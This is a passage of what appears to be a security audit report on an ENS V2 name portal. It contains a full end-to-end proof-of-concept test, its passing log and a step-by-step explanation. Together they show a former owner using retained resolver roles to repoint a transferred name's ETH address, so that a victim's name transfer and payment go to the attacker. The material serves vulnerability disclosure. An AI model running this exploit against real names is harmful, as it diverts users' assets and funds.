    formerOwnerCanWriteText,
    formerOwnerCanWriteAddr,
    currentOwnerCanWriteText,
    currentOwnerCanWriteAddr,
  }
}

async function readTokenOwner(name: string) {
  const labelHash = BigInt(keccak256(toHex(labelOf(name))))
  const tokenId = await publicClient.readContract({
    address: V2_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'getTokenId',
    args: [labelHash],
  })
  const owner = await publicClient.readContract({
    address: V2_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'ownerOf',
    args: [tokenId],
  })
  return { tokenId, owner }
}

async function logTransactionsSince(
  label: string,
  startBlock: bigint,
  from: Address,
): Promise<ReceiptLog[]> {
  const latestBlock = await getFreshBlockNumber()
  const result: ReceiptLog[] = []

  for (
    let blockNumber = startBlock + 1n;
    blockNumber <= latestBlock;
    blockNumber++
  ) {
    const block = await publicClient.getBlock({
      blockNumber,
      includeTransactions: true,
    })

    for (const transaction of block.transactions) {
      if (typeof transaction === 'string') continue
      if (normalized(transaction.from) !== normalized(from)) continue

      const receipt = await publicClient.getTransactionReceipt({
        hash: transaction.hash,
      })
      const effectiveGasPrice = receipt.effectiveGasPrice ?? 0n
      const feeWei = receipt.gasUsed * effectiveGasPrice
      const item: ReceiptLog = {
        hash: transaction.hash,
        blockNumber,
        to: transaction.to,
        gasUsed: receipt.gasUsed,
        effectiveGasPrice,
        feeWei,
      }
      result.push(item)
      console.log(
        `[E2E][${label}][tx] hash=${item.hash} block=${item.blockNumber} ` +
          `from=${transaction.from} to=${item.to ?? 'contract-creation'} ` +
          `status=${receipt.status} gasUsed=${item.gasUsed} ` +
          `effectiveGasPrice=${item.effectiveGasPrice} ` +
          `feeWei=${item.feeWei} feeETH=${formatEther(item.feeWei)}`,
      )
    }
  }

  if (result.length === 0) {
    throw new Error(
      `[E2E][${label}] no transaction from ${from} after block ${startBlock}`,
    )
  }
  return result
}

async function driveTransactionsToSuccess(
  page: Page,
  wallet: Web3ProviderBackend,
  successTxIds: string[],
  timeoutMs = 240_000,
): Promise<void> {
  const dialog = page.locator('[data-slot="dialog-content"]')
  await expect(dialog).toBeVisible({ timeout: 30_000 })

  const succeeded = new Set<string>()
  const onConsole = (message: { text(): string }) => {
    const text = message.text()
    if (text.includes('TRANSACTION MANAGER')) {
      console.log(`[E2E][browser-console] ${text}`)
    }
    for (const id of successTxIds) {
      if (text.includes(`Transaction ${id} state: success`)) succeeded.add(id)
    }
  }
  page.on('console', onConsole)

  try {
    const deadline = Date.now() + timeoutMs
    while (Date.now() < deadline) {
      const openWallet = dialog.getByRole('button', { name: /open wallet/i })
      if (await openWallet.isVisible().catch(() => false)) {
        await openWallet.click()
        await authorizeTransaction(wallet, 60_000)
        await page.waitForTimeout(500)
        continue
      }

      const waiting = dialog.getByRole('button', { name: /^Waiting\.\.\.$/i })
      if (await waiting.isVisible().catch(() => false)) {
        const walletButton = waiting.locator(
          'xpath=preceding-sibling::button[1]',
        )
        if (await walletButton.isVisible().catch(() => false)) {
          await walletButton.click()
          await authorizeTransaction(wallet, 60_000)
          await page.waitForTimeout(500)
          continue
        }
      }

      const primary = dialog.getByRole('button', {
        name: /^(Start|Next|Done)$/i,
      })
      if (
        (await primary.isVisible().catch(() => false)) &&
        (await primary.isEnabled().catch(() => false))
      ) {
        await primary.click()
        await page.waitForTimeout(500)
        continue
      }

      if (succeeded.size === successTxIds.length) break
      await page.waitForTimeout(1_000)
    }
  } finally {
    page.off('console', onConsole)
  }

  expect([...succeeded].sort()).toEqual([...successTxIds].sort())
}

async function addOrEditEthRecord(
  page: Page,
  value: Address,
  mode: 'add' | 'edit',
): Promise<void> {
  if (mode === 'add') {
    await page.getByLabel('Type').selectOption('address')
    await page
      .getByRole('combobox')
      .filter({ hasText: 'Select coin...' })
      .click()
    await page.getByRole('button', { name: /ETH.*Ethereum/i }).click()
    await page.getByLabel('Value').fill(value)
    await page.getByRole('button', { name: 'Add record', exact: true }).click()
  } else {
    const ethRow = page.locator('tbody tr').filter({ hasText: 'ETH' }).first()
    await expect(ethRow).toBeVisible({ timeout: 15_000 })
    await ethRow.locator('input').fill(value)
  }

  const saveButton = page.getByRole('button', { name: /Save \d+ change/ })
  await expect(saveButton).toBeEnabled({ timeout: 15_000 })
  await saveButton.click()
}

async function gotoUntilHeading(
  page: Page,
  url: string,
  heading: string,
  timeoutMs = 120_000,
): Promise<void> {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    await page.goto(url)
    if (
      await page
        .getByRole('heading', { name: heading })
        .isVisible()
        .catch(() => false)
    ) {
      return
    }
    await page.waitForTimeout(3_000)
  }
  await expect(page.getByRole('heading', { name: heading })).toBeVisible({
    timeout: 1_000,
  })
}

test('former owner can redirect transferred name through the production portal', async ({
  portalPage: page,
  wallet,
  accounts,
  makeName,
}) => {
  test.setTimeout(600_000)

  const formerOwner = accounts.getAddress('user')
  const newOwner = accounts.getAddress('user2')
  const attackerRecipient = accounts.getAddress('user3')
  const victim = accounts.getAddress('user4')

  console.log('[E2E][setup] connecting the seller wallet through the portal')
  await connectWithHeadlessWallet(page, wallet)

  const name = await makeName({
    label: 'audit-stale-resolver-access',
    owner: 'user',
    records: [
      {
        key: 'description',
        value: 'legitimate buyer profile before transfer',
      },
    ],
  })

  console.log(
    `[E2E][setup] name=${name} formerOwner=${formerOwner} ` +
      `newOwner=${newOwner} attackerRecipient=${attackerRecipient}`,
  )

  const victimName = await makeName({
    label: 'audit-stale-resolver-victim',
    owner: 'user4',
    records: [
      {
        key: 'description',
        value: 'victim-owned name before unintended transfer',
      },
    ],
  })
  const victimTokenBefore = await readTokenOwner(victimName)
  console.log(
    `[E2E][setup][victim] victimName=${victimName} victim=${victim} ` +
      `tokenId=${victimTokenBefore.tokenId} ` +
      `ownerBefore=${victimTokenBefore.owner}`,
  )
  expect(normalized(victimTokenBefore.owner)).toBe(normalized(victim))

  await gotoUntilHeading(
    page,
    `${PORTAL_APP_URL}/${name}/edit-records`,
    'Edit records',
  )

  console.log('[E2E][baseline] seller sets addr(60) to the future buyer')
  const baselineStartBlock = await getFreshBlockNumber()
  await addOrEditEthRecord(page, newOwner, 'add')
  await driveTransactionsToSuccess(page, wallet, ['tx-save-resolver-records'])
  const baselineTxs = await logTransactionsSince(
    'baseline-record-write',
    baselineStartBlock,
    formerOwner,
  )
  console.log(
    `[E2E][baseline] production save completed with ${baselineTxs.length} ` +
      `seller transaction(s) and total feeWei=${baselineTxs.reduce((sum, tx) => sum + tx.feeWei, 0n)}`,
  )

  const resolverAddress = (await publicClient.readContract({
    address: V2_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'getResolver',
    args: [labelOf(name)],
  })) as Address
  const baseline = await readGroundTruthForAccounts(
    name,
    resolverAddress,
    formerOwner,
    newOwner,
  )
  console.log(
    `[E2E][baseline][chain] tokenId=${baseline.tokenId} node=${baseline.node} ` +
      `owner=${baseline.owner} resolver=${baseline.resolver} ` +
      `addr(60)=${baseline.ethAddress} description=${JSON.stringify(baseline.description)} ` +
      `formerOwnerRoleSetAddr=${baseline.formerOwnerCanWriteAddr} ` +
      `formerOwnerRoleSetText=${baseline.formerOwnerCanWriteText} ` +
      `newOwnerRoleSetAddr=${baseline.currentOwnerCanWriteAddr} ` +
      `newOwnerRoleSetText=${baseline.currentOwnerCanWriteText}`,
  )
  expect(normalized(baseline.owner)).toBe(normalized(formerOwner))
  expect(normalized(baseline.ethAddress)).toBe(normalized(newOwner))
  expect(normalized(baseline.resolver)).toBe(normalized(resolverAddress))
  expect(baseline.formerOwnerCanWriteAddr).toBe(true)
  expect(baseline.formerOwnerCanWriteText).toBe(true)

  await page.goto(`${PORTAL_APP_URL}/${name}/ownership/transfer`)
  await expect(
    page.getByRole('heading', { name: 'Transfer ownership' }),
  ).toBeVisible({ timeout: 30_000 })
  await page.getByPlaceholder('ENS name or address').fill(newOwner)
  const detachResolver = page.getByRole('switch', {
    name: 'Detach the resolver',
  })
  await expect(detachResolver).toBeVisible({ timeout: 30_000 })
  await expect(detachResolver).toHaveAttribute('aria-checked', 'true')
  await detachResolver.click()
  await expect(detachResolver).toHaveAttribute('aria-checked', 'false')
  await expect(
    page.getByText(/other records will keep resolving after the transfer/i),
  ).toBeVisible()
  console.log(
    '[E2E][transfer] detachResolver=false; warning confirms records remain, but no role-revocation warning is shown',
  )

  const transferStartBlock = await getFreshBlockNumber()
  await page.getByRole('button', { name: 'Transfer name' }).click()
  await driveTransactionsToSuccess(page, wallet, [
    `transfer-${name}-set-eth-addr`,
    `transfer-${name}-transfer-token`,
  ])
  const transferTxs = await logTransactionsSince(
    'ownership-transfer',
    transferStartBlock,
    formerOwner,
  )

  const afterTransfer = await readGroundTruthForAccounts(
    name,
    resolverAddress,
    formerOwner,
    newOwner,
  )
  console.log(
    `[E2E][transfer][chain] tokenId=${afterTransfer.tokenId} node=${afterTransfer.node} ` +
      `owner=${afterTransfer.owner} resolver=${afterTransfer.resolver} ` +
      `addr(60)=${afterTransfer.ethAddress} description=${JSON.stringify(afterTransfer.description)} ` +
      `formerOwnerRoleSetAddr=${afterTransfer.formerOwnerCanWriteAddr} ` +
      `formerOwnerRoleSetText=${afterTransfer.formerOwnerCanWriteText} ` +
      `newOwnerRoleSetAddr=${afterTransfer.currentOwnerCanWriteAddr} ` +
      `newOwnerRoleSetText=${afterTransfer.currentOwnerCanWriteText} ` +
      `totalFeeWei=${transferTxs.reduce((sum, tx) => sum + tx.feeWei, 0n)}`,
  )
  expect(normalized(afterTransfer.owner)).toBe(normalized(newOwner))
  expect(normalized(afterTransfer.resolver)).toBe(normalized(resolverAddress))
  expect(normalized(afterTransfer.ethAddress)).toBe(normalized(newOwner))
  expect(afterTransfer.formerOwnerCanWriteAddr).toBe(true)
  expect(afterTransfer.formerOwnerCanWriteText).toBe(true)
  expect(afterTransfer.currentOwnerCanWriteAddr).toBe(false)
  expect(afterTransfer.currentOwnerCanWriteText).toBe(false)

  await wallet.changeAccounts([accounts.getPrivateKey('user2')])
  await expect(
    page.getByRole('button', {
      name: new RegExp(`Wallet menu for.*${newOwner.slice(-3)}`, 'i'),
    }),
  ).toBeVisible({ timeout: 30_000 })
  await page.goto(`${PORTAL_APP_URL}/${name}/edit-records`)
  await expect(
    page.getByText('Permission Denied', { exact: true }),
  ).toBeVisible({
    timeout: 30_000,
  })
  console.log(
    '[E2E][negative-control] current ERC-1155 owner is denied by portal useCanEditRecords because buyer has no resolver role',
  )

  await wallet.changeAccounts([accounts.getPrivateKey('user')])
  await expect(
    page.getByRole('button', {
      name: new RegExp(`Wallet menu for.*${formerOwner.slice(-3)}`, 'i'),
    }),
  ).toBeVisible({ timeout: 30_000 })
  await page.goto(`${PORTAL_APP_URL}/${name}/edit-records`)
  await expect(page.getByRole('heading', { name: 'Edit records' })).toBeVisible(
    {
      timeout: 30_000,
    },
  )

  const attackStartBlock = await getFreshBlockNumber()
  console.log(
    `[E2E][attack] former owner edits addr(60) from ${newOwner} to ${attackerRecipient} through portal saveRecords`,
  )
  await addOrEditEthRecord(page, attackerRecipient, 'edit')
  await driveTransactionsToSuccess(page, wallet, ['tx-save-resolver-records'])
  const attackTxs = await logTransactionsSince(
    'unauthorized-record-write',
    attackStartBlock,
    formerOwner,
  )

  const finalState = await readGroundTruthForAccounts(
    name,
    resolverAddress,
    formerOwner,
    newOwner,
  )
  console.log(
    `[E2E][impact][chain] tokenId=${finalState.tokenId} node=${finalState.node} ` +
      `owner=${finalState.owner} resolver=${finalState.resolver} ` +
      `addr(60)_before=${afterTransfer.ethAddress} ` +
      `addr(60)_after=${finalState.ethAddress} description=${JSON.stringify(finalState.description)} ` +
      `formerOwnerRoleSetAddr=${finalState.formerOwnerCanWriteAddr} ` +
      `formerOwnerRoleSetText=${finalState.formerOwnerCanWriteText} ` +
      `newOwnerRoleSetAddr=${finalState.currentOwnerCanWriteAddr} ` +
      `newOwnerRoleSetText=${finalState.currentOwnerCanWriteText} ` +
      `attackTxCount=${attackTxs.length} ` +
      `attackFeeWei=${attackTxs.reduce((sum, tx) => sum + tx.feeWei, 0n)} ` +
      `attackFeeETH=${formatEther(attackTxs.reduce((sum, tx) => sum + tx.feeWei, 0n))}`,
  )

  expect(normalized(finalState.owner)).toBe(normalized(newOwner))
  expect(normalized(finalState.resolver)).toBe(normalized(resolverAddress))
  expect(normalized(finalState.ethAddress)).toBe(normalized(attackerRecipient))
  expect(finalState.formerOwnerCanWriteAddr).toBe(true)
  expect(finalState.formerOwnerCanWriteText).toBe(true)
  expect(finalState.currentOwnerCanWriteAddr).toBe(false)
  expect(finalState.currentOwnerCanWriteText).toBe(false)

  await page.goto(`${PORTAL_APP_URL}/${name}/address`)
  await expect(page.getByText(attackerRecipient, { exact: true })).toBeVisible({
    timeout: 45_000,
  })
  const displayedRecipient = (
    await page.getByText(attackerRecipient, { exact: true }).innerText()
  ).trim()
  const victimRecipient = getAddress(displayedRecipient)
  console.log(
    `[E2E][impact][portal] ${name} now displays/resolves addr(60)=${attackerRecipient} while ownerOf(tokenId)=${finalState.owner}`,
  )

  expect(normalized(victimRecipient)).toBe(normalized(attackerRecipient))

  await wallet.changeAccounts([accounts.getPrivateKey('user4')])
  await expect(
    page.getByRole('button', {
      name: new RegExp(`Wallet menu for.*${victim.slice(-3)}`, 'i'),
    }),
  ).toBeVisible({ timeout: 30_000 })
  await page.goto(`${PORTAL_APP_URL}/${victimName}/ownership/transfer`)
  await expect(
    page.getByRole('heading', { name: 'Transfer ownership' }),
  ).toBeVisible({ timeout: 30_000 })
  await page.getByPlaceholder('ENS name or address').fill(name)
  await expect(page.getByText(victimRecipient, { exact: true })).toBeVisible({
    timeout: 45_000,
  })

  const victimDetachResolver = page.getByRole('switch', {
    name: 'Detach the resolver',
  })
  await expect(victimDetachResolver).toBeVisible({ timeout: 30_000 })
  await expect(victimDetachResolver).toHaveAttribute('aria-checked', 'true')

  console.log(
    `[E2E][impact][native-transfer] victim=${victim} enters recipientName=${name} ` +
      `expectedFromBaseline=${newOwner} resolvedByPortal=${victimRecipient} ` +
      `targetName=${victimName} tokenId=${victimTokenBefore.tokenId}`,
  )
  const nativeTransferStartBlock = await getFreshBlockNumber()
  await page.getByRole('button', { name: 'Transfer name' }).click()
  await driveTransactionsToSuccess(page, wallet, [
    `transfer-${victimName}-detach-resolver`,
    `transfer-${victimName}-transfer-token`,
  ])
  const nativeTransferTxs = await logTransactionsSince(
    'native-portal-impact-transfer',
    nativeTransferStartBlock,
    victim,
  )
  const victimTokenAfter = await readTokenOwner(victimName)
  const nativeTransferFeeWei = nativeTransferTxs.reduce(
    (sum, tx) => sum + tx.feeWei,
    0n,
  )
  console.log(
    `[E2E][impact][native-transfer][chain] victimName=${victimName} ` +
      `tokenId=${victimTokenAfter.tokenId} ownerBefore=${victimTokenBefore.owner} ` +
      `ownerAfter=${victimTokenAfter.owner} resolvedRecipient=${victimRecipient} ` +
      `txCount=${nativeTransferTxs.length} totalFeeWei=${nativeTransferFeeWei} ` +
      `totalFeeETH=${formatEther(nativeTransferFeeWei)}`,
  )
  expect(victimTokenAfter.tokenId).toBe(victimTokenBefore.tokenId)
  expect(normalized(victimTokenAfter.owner)).toBe(normalized(victimRecipient))

  const victimAccount = privateKeyToAccount(accounts.getPrivateKey('user4'))
  const paymentValue = parseEther('0.01')
  const victimBalanceBefore = await publicClient.getBalance({ address: victim })
  const attackerBalanceBefore = await publicClient.getBalance({
    address: victimRecipient,
  })
  const paymentHash = await walletClient.sendTransaction({
    account: victimAccount,
    to: victimRecipient,
    value: paymentValue,
  })
  const paymentReceipt = await publicClient.waitForTransactionReceipt({
    hash: paymentHash,
  })
  const paymentGasPrice = paymentReceipt.effectiveGasPrice ?? 0n
  const paymentFeeWei = paymentReceipt.gasUsed * paymentGasPrice
  const victimBalanceAfter = await publicClient.getBalance({ address: victim })
  const attackerBalanceAfter = await publicClient.getBalance({
    address: victimRecipient,
  })
  const victimValueLossWei = victimBalanceBefore - victimBalanceAfter
  const victimTotalLossWei = paymentValue + paymentFeeWei

  console.log(
    `[E2E][impact][payment][tx] hash=${paymentHash} block=${paymentReceipt.blockNumber} ` +
      `from=${victim} to=${victimRecipient} status=${paymentReceipt.status} ` +
      `valueWei=${paymentValue} valueETH=${formatEther(paymentValue)} ` +
      `gasUsed=${paymentReceipt.gasUsed} effectiveGasPrice=${paymentGasPrice} ` +
      `feeWei=${paymentFeeWei} feeETH=${formatEther(paymentFeeWei)}`,
  )
  console.log(
    `[E2E][impact][payment][balances] victimBalanceBefore=${victimBalanceBefore} ` +
      `victimBalanceAfter=${victimBalanceAfter} ` +
      `attackerBalanceBefore=${attackerBalanceBefore} ` +
      `attackerBalanceAfter=${attackerBalanceAfter} ` +
      `victimValueLossWei=${victimValueLossWei} ` +
      `victimTotalLossWei=${victimTotalLossWei} ` +
      `victimTotalLossETH=${formatEther(victimTotalLossWei)}`,
  )

  expect(paymentReceipt.status).toBe('success')
  expect(normalized(victimRecipient)).toBe(normalized(attackerRecipient))
  expect(attackerBalanceAfter - attackerBalanceBefore).toBe(paymentValue)
  expect(victimValueLossWei).toBe(victimTotalLossWei)
})
```

### Complete successful-run log

The following is the complete terminal security-evidence output from the final corrected-source passing run used in this report on 2026-08-28. It includes the successful native Portal impact transactions, the direct chain-state assertions, the Portal rendering assertion, and the separately accounted downstream payment receipt/balance assertions:

```
Running 1 test using 1 worker

(node:12473) Warning: The 'NO_COLOR' env is ignored due to the 'FORCE_COLOR' env being set.
(Use `node --trace-warnings ...` to show where the warning was created)
(node:12473) Warning: The 'NO_COLOR' env is ignored due to the 'FORCE_COLOR' env being set.
(Use `node --trace-warnings ...` to show where the warning was created)
[E2E][setup] connecting the seller wallet through the portal
[makeName] registering audit-stale-resolver-access-1787930625.eth (duration=2419200s, desiredGapPastExpiry=0s, records=1)
[makeName] resolver proxy: 0xf84da407170D1642A284645037A2f9C1cAF217c1
[makeName] waiting 61s for MIN_COMMITMENT_AGE
[makeName] set 1 record(s) on audit-stale-resolver-access-1787930625.eth
[makeName] ✅ registered audit-stale-resolver-access-1787930625.eth
[time] sync — browser clock set to 2026-08-28T15:30:44.000Z
[makeName] ready: audit-stale-resolver-access-1787930625.eth
[E2E][setup] name=audit-stale-resolver-access-1787930625.eth formerOwner=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 newOwner=0x70997970C51812dc3A010C7d01b50e0d17dc79C8 attackerRecipient=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
[makeName] registering audit-stale-resolver-victim-1787930630.eth (duration=2419200s, desiredGapPastExpiry=0s, records=1)
[makeName] resolver proxy: 0x1ecEdFe0df778ffdFa987C9EbD64E91Ce964388a
[makeName] waiting 61s for MIN_COMMITMENT_AGE
[makeName] set 1 record(s) on audit-stale-resolver-victim-1787930630.eth
[makeName] ✅ registered audit-stale-resolver-victim-1787930630.eth
[time] sync — browser clock set to 2026-08-28T15:31:50.000Z
[makeName] ready: audit-stale-resolver-victim-1787930630.eth
[E2E][setup][victim] victimName=audit-stale-resolver-victim-1787930630.eth victim=0x90F79bf6EB2c4f870365E785982E1f101E93b906 tokenId=111691872372097001870290707158648147930855833852031452623577822318151830863872 ownerBefore=0x90F79bf6EB2c4f870365E785982E1f101E93b906
[E2E][baseline] seller sets addr(60) to the future buyer
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction tx-save-resolver-records state: submitting
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction tx-save-resolver-records state: pending
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction tx-save-resolver-records state: success
[E2E][baseline-record-write][tx] hash=0x7cf11e76a84ee439294b163ee4c0b17da29ae33463ee041922539b9f6037886f block=11585706 from=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 to=0xf84da407170d1642a284645037a2f9c1caf217c1 status=success gasUsed=64542 effectiveGasPrice=1000069621 feeWei=64546493478582 feeETH=0.000064546493478582
[E2E][baseline] production save completed with 1 seller transaction(s) and total feeWei=64546493478582
[E2E][baseline][chain] tokenId=98424890455114383770836714131934572610270225568111267596626400654563347529728 node=0xd19d124ff33bee40fdb66b6a84b3755425f78fc8855195a64bf619988b4b2e05 owner=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 resolver=0xf84da407170D1642A284645037A2f9C1cAF217c1 addr(60)=0x70997970c51812dc3a010c7d01b50e0d17dc79c8 description="legitimate buyer profile before transfer" formerOwnerRoleSetAddr=true formerOwnerRoleSetText=true newOwnerRoleSetAddr=false newOwnerRoleSetText=false
[E2E][transfer] detachResolver=false; warning confirms records remain, but no role-revocation warning is shown
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-access-1787930625.eth-set-eth-addr state: submitting
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-access-1787930625.eth-set-eth-addr state: pending
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-access-1787930625.eth-set-eth-addr state: success
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-access-1787930625.eth-transfer-token state: submitting
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-access-1787930625.eth-transfer-token state: pending
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-access-1787930625.eth-transfer-token state: success
[E2E][ownership-transfer][tx] hash=0x0acfe19216cf3dca8df27c124be5c71c625afa6d610707ae3e9dee7d79fe268b block=11585707 from=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 to=0xf84da407170d1642a284645037a2f9c1caf217c1 status=success gasUsed=44642 effectiveGasPrice=1000060938 feeWei=44644720394196 feeETH=0.000044644720394196
[E2E][ownership-transfer][tx] hash=0x067b052a32024b952e36e7c363b2049f3cbd266848384c471cc9876830ad364a block=11585708 from=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 to=0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2 status=success gasUsed=77890 effectiveGasPrice=1000053333 feeWei=77894154107370 feeETH=0.00007789415410737
[E2E][transfer][chain] tokenId=98424890455114383770836714131934572610270225568111267596626400654563347529728 node=0xd19d124ff33bee40fdb66b6a84b3755425f78fc8855195a64bf619988b4b2e05 owner=0x70997970C51812dc3A010C7d01b50e0d17dc79C8 resolver=0xf84da407170D1642A284645037A2f9C1cAF217c1 addr(60)=0x70997970c51812dc3a010c7d01b50e0d17dc79c8 description="legitimate buyer profile before transfer" formerOwnerRoleSetAddr=true formerOwnerRoleSetText=true newOwnerRoleSetAddr=false newOwnerRoleSetText=false totalFeeWei=122538874501566
[E2E][negative-control] current ERC-1155 owner is denied by portal useCanEditRecords because buyer has no resolver role
[E2E][attack] former owner edits addr(60) from 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 to 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC through portal saveRecords
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction tx-save-resolver-records state: submitting
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction tx-save-resolver-records state: pending
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction tx-save-resolver-records state: success
[E2E][unauthorized-record-write][tx] hash=0x73daef66718ccdcff853ac89b623af64dd12a51ef06f929cdf49b2e676af6168 block=11585709 from=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 to=0xf84da407170d1642a284645037a2f9c1caf217c1 status=success gasUsed=47430 effectiveGasPrice=1000046684 feeWei=47432214222120 feeETH=0.00004743221422212
[E2E][impact][chain] tokenId=98424890455114383770836714131934572610270225568111267596626400654563347529728 node=0xd19d124ff33bee40fdb66b6a84b3755425f78fc8855195a64bf619988b4b2e05 owner=0x70997970C51812dc3A010C7d01b50e0d17dc79C8 resolver=0xf84da407170D1642A284645037A2f9C1cAF217c1 addr(60)_before=0x70997970c51812dc3a010c7d01b50e0d17dc79c8 addr(60)_after=0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc description="legitimate buyer profile before transfer" formerOwnerRoleSetAddr=true formerOwnerRoleSetText=true newOwnerRoleSetAddr=false newOwnerRoleSetText=false attackTxCount=1 attackFeeWei=47432214222120 attackFeeETH=0.00004743221422212
[E2E][impact][portal] audit-stale-resolver-access-1787930625.eth now displays/resolves addr(60)=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC while ownerOf(tokenId)=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[E2E][impact][native-transfer] victim=0x90F79bf6EB2c4f870365E785982E1f101E93b906 enters recipientName=audit-stale-resolver-access-1787930625.eth expectedFromBaseline=0x70997970C51812dc3A010C7d01b50e0d17dc79C8 resolvedByPortal=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC targetName=audit-stale-resolver-victim-1787930630.eth tokenId=111691872372097001870290707158648147930855833852031452623577822318151830863872
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-victim-1787930630.eth-detach-resolver state: pending
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-victim-1787930630.eth-detach-resolver state: success
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-victim-1787930630.eth-transfer-token state: submitting
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-victim-1787930630.eth-transfer-token state: pending
[E2E][browser-console] 📊 [TRANSACTION MANAGER] Transaction transfer-audit-stale-resolver-victim-1787930630.eth-transfer-token state: success
[E2E][native-portal-impact-transfer][tx] hash=0x3d60a09c3eed15c8a604fe2fc9f9276931e34d8b2750847659728422b2141384 block=11585710 from=0x90f79bf6eb2c4f870365e785982e1f101e93b906 to=0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2 status=success gasUsed=40226 effectiveGasPrice=1000040858 feeWei=40227643553908 feeETH=0.000040227643553908
[E2E][native-portal-impact-transfer][tx] hash=0x1e6f86e072f2dcdde79a3bf6bd773fa33c8128978aa90321a8b9eacd231b6995 block=11585711 from=0x90f79bf6eb2c4f870365e785982e1f101e93b906 to=0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2 status=success gasUsed=77878 effectiveGasPrice=1000035758 feeWei=77880784761524 feeETH=0.000077880784761524
[E2E][impact][native-transfer][chain] victimName=audit-stale-resolver-victim-1787930630.eth tokenId=111691872372097001870290707158648147930855833852031452623577822318151830863872 ownerBefore=0x90F79bf6EB2c4f870365E785982E1f101E93b906 ownerAfter=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC resolvedRecipient=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC txCount=2 totalFeeWei=118108428315432 totalFeeETH=0.000118108428315432
[E2E][impact][payment][tx] hash=0x1bb9ed3cd62a0536dd2959c134f3fb273e4cb08087fa7e20a99a48bf602193b6 block=11585712 from=0x90F79bf6EB2c4f870365E785982E1f101E93b906 to=0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC status=success valueWei=10000000000000000 valueETH=0.01 gasUsed=21000 effectiveGasPrice=1000031300 feeWei=21000657300000 feeETH=0.0000210006573
[E2E][impact][payment][balances] victimBalanceBefore=9999998001125376627809 victimBalanceAfter=9999987980124719327809 attackerBalanceBefore=10000000000000000000000 attackerBalanceAfter=10000010000000000000000 victimValueLossWei=10021000657300000 victimTotalLossWei=10021000657300000 victimTotalLossETH=0.0100210006573
  ✓  1 [portal-e2e] › projects/portal/tests/audit-stale-resolver-access.spec.ts:370:1 › former owner can redirect transferred name through the production portal (2.5m)

  1 passed (2.6m)
```

### What the PoC proves

{% stepper %}
{% step %}

## Create isolated ENS V2 names and dedicated resolvers

The repository's E2E setup registers a fresh ENS V2 `.eth` name for the attack path and a second independently victim-owned ENS V2 `.eth` name for the native impact path. It creates dedicated `PermissionedResolver` proxies with the expected role model.
{% endstep %}

{% step %}

## Establish the legitimate baseline

The seller uses the real Portal edit-records route and production `saveRecords()` transaction to establish the legitimate baseline `addr(60) = buyer`.
{% endstep %}

{% step %}

## Transfer without detaching the resolver

The seller uses the real Portal ownership-transfer route with `detachResolver=false`. The Portal completes the real `setEthAddress()` and ERC-1155 `safeTransferFrom()` transactions without revoking resolver roles.
{% endstep %}

{% step %}

## Verify stale authorization state

Direct chain reads prove that the buyer is now `ownerOf(tokenId)`, the resolver remains attached, the former seller still has `ROLE_SET_ADDR` and `ROLE_SET_TEXT`, and the buyer has neither role.
{% endstep %}

{% step %}

## Confirm authorization behavior in the Portal

The real Portal negative control denies the buyer access while the former seller is allowed into the same editor, proving the stale-role authorization rather than a public-resolver or display-only issue.
{% endstep %}

{% step %}

## Poison resolution through the production editor

The former seller uses the real Portal editor and production `saveRecords()` path to change `addr(60)` from the buyer to `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`. The mined transaction succeeds.
{% endstep %}

{% step %}

## Verify the Portal resolves the attacker-controlled address

Direct chain reads prove the name is still buyer-owned while `addr(node, 60)` is now the attacker-controlled address. The real Portal `/$name/address` route displays that same attacker address.
{% endstep %}

{% step %}

## Execute the native wrong-recipient transfer

The test takes the exact address rendered by the Portal DOM and has `user4` enter the poisoned ENS name into the Portal's native `Transfer name` form. The Portal displays the same attacker address as the recipient, and the victim clicks the native transfer action.

The Portal's production transaction manager submits the resolver-detach transaction and the ERC-1155 `safeTransferFrom()` transaction. Direct chain reads prove the victim-owned name's `ownerOf(tokenId)` changes from `user4` to `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`. This is the primary loss-producing impact proof and does not depend on a direct `sendTransaction()` call.
{% endstep %}

{% step %}

## Perform secondary ETH settlement evidence

